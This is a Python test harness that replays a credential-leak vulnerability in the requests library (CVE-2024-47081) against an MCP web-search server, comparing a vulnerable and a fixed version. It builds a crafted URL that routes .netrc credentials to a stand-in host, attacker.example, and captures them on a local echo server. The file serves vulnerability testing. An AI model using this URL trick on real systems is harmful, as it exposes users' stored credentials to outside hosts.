"""Independent GH-P2-039 paired replay runner."""
from __future__ import annotations
import argparse
import base64
import json
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from shared_host_runner import evidence_rows, run_shared_host_case
CASE_ID = 'GH-P2-039'
SERVER = 'Tammura/mcp-web-search'
SOURCE_COMMIT = 'bf76748d9a2bc80c3dbb9a302b57577b0847d188'
VULNERABLE_REQUESTS = '2.32.3'
FIXED_REQUESTS = '2.32.4'
NETRC_MACHINE = 'example.com'
NETRC_LOGIN = 'GT_P2_039_USER'
NETRC_PASSWORD = 'GT_P2_039_SECRET'
URL_USERINFO_PASSWORD = 'GT_P2_039_BASELINE'
EFFECT = 'Basic ' + base64.b64encode(f"""{NETRC_LOGIN}:{NETRC_PASSWORD}""".encode()).decode()
SAFE_USERINFO = 'Basic ' + base64.b64encode(f"""{NETRC_MACHINE}:{URL_USERINFO_PASSWORD}""".encode()).decode()
BOUNDARY_MESSAGE = 'GT_P2_039_BOUNDARY_RESPONSE_MESSAGE'

class ControlledBoundary:

    def __init__(self) -> None:
        self.requests: list[dict[str, object]] = []
        self.lock = threading.Lock()
        boundary = self

        class Handler(BaseHTTPRequestHandler):

            def do_GET(self) -> None:
                headers = {str(key).lower(): str(value) for key, value in self.headers.items()}
                with boundary.lock:
                    boundary.requests.append({'method': self.command, 'path': self.path, 'headers': headers})
                reflected = headers.get('authorization', 'NO_AUTH')
                body = f"""<html><head><title>GT P2 039</title></head><body><p>{BOUNDARY_MESSAGE}</p><p>AUTH_PROBE:{reflected}</p></body></html>""".encode('utf-8')
                self.send_response(200)
                self.send_header('Content-Type', 'text/html; charset=utf-8')
                self.send_header('Content-Length', str(len(body)))
                self.send_header('Connection', 'close')
                self.end_headers()
                self.wfile.write(body)

            def log_message(self, *_args: object) -> None:
                return
        self.server = ThreadingHTTPServer(('127.0.0.1', 0), Handler)
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)

    @property
    def port(self) -> int:
        return int(self.server.server_address[1])

    def start(self) -> None:
        self.thread.start()

    def close(self) -> None:
        self.server.shutdown()
        self.server.server_close()
        self.thread.join(timeout=3)

def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument('--side', choices=('vulnerable', 'fixed'), required=True)
    parser.add_argument('--repetition', type=int, choices=(1, 2, 3), required=True)
    parser.add_argument('--output', type=Path, required=True)
    args = parser.parse_args()
    boundary = ControlledBoundary()
    boundary.start()
    requests_version = VULNERABLE_REQUESTS if args.side == 'vulnerable' else FIXED_REQUESTS
    home = Path('/tmp/gt-home')
    netrc = home / '.netrc'
    home.mkdir(parents=True, exist_ok=True)
    netrc.write_text(f"""machine {NETRC_MACHINE} login {NETRC_LOGIN} password {NETRC_PASSWORD}\n""", encoding='utf-8')
    netrc.chmod(384)
    url = f"""http://{NETRC_MACHINE}:{URL_USERINFO_PASSWORD}@attacker.example:{boundary.port}/GH-P2-039"""
    env = {'PYTHONPATH': f"""/workspace/source:/opt/deps/{args.side}:/opt/deps/common""", 'PATH': '/usr/local/bin:/usr/bin:/bin', 'HOME': str(home), 'NETRC': str(netrc), 'PYTHONIOENCODING': 'utf-8', 'PYTHONWARNINGS': 'ignore', 'HTTP_PROXY': '', 'HTTPS_PROXY': '', 'ALL_PROXY': '', 'http_proxy': '', 'https_proxy': '', 'all_proxy': '', 'NO_PROXY': 'attacker.example,127.0.0.1,localhost', 'no_proxy': 'attacker.example,127.0.0.1,localhost'}
    command = ['python', '-m', 'src.mcp_web_search.server']
    try:
        record = run_shared_host_case(run_id=f"""{CASE_ID}-{args.side}-{args.repetition}""", case_id=CASE_ID, revision=args.side, repetition=args.repetition, command=command, cwd=Path('/workspace/source'), env=env, server_name=SERVER, tool_name='web_fetch', tool_arguments={'url': url, 'output_format': 'text'}, task='Call the frozen web_fetch Tool and report only its returned result.', system_prompt='You are a deterministic research host. Use the frozen tool call and report only its returned Tool result.', server_revision=f"""{SOURCE_COMMIT};requests=={requests_version}""", timeout=60)
        record['external_boundary'] = {'boundary': 'container-local HTTP boundary at attacker.example; Docker network none', 'request_count': len(boundary.requests), 'requests': boundary.requests, 'target_url_projection': 'http://example.com:GT_P2_039_BASELINE@attacker.example:{BOUNDARY_PORT}/GH-P2-039', 'netrc_machine': NETRC_MACHINE, 'effect_rule': 'Only the synthetic .netrc-derived Authorization reflected in the web_fetch Tool result and exact L4 is the vulnerability signal; the explicit URL userinfo Basic example.com:GT_P2_039_BASELINE value is the fixed baseline.'}
        record['pair_metadata'] = {'dependency': 'requests', 'vulnerable_version': VULNERABLE_REQUESTS, 'fixed_version': FIXED_REQUESTS, 'vulnerability': 'GHSA-9hjg-9r4m-mvj7 / CVE-2024-47081', 'expected_vulnerable_boundary_authorization': EFFECT, 'expected_fixed_boundary_authorization': SAFE_USERINFO, 'expected_l4_marker': BOUNDARY_MESSAGE}
        args.output.mkdir(parents=True, exist_ok=True)
        (args.output / 'host_record.json').write_text(json.dumps(record, ensure_ascii=False, indent=2) + '\n', encoding='utf-8')
        (args.output / 'evidence.jsonl').write_text(''.join((json.dumps(row, ensure_ascii=False) + '\n' for row in evidence_rows(record))), encoding='utf-8')
        valid = record['quality']['invalid_run'] is False
        print(json.dumps({'status': 'OK' if valid else 'INVALID', 'output': str(args.output), 'request_count': len(boundary.requests)}))
        return 0 if valid else 1
    finally:
        boundary.close()
if __name__ == '__main__':
    raise SystemExit(main())
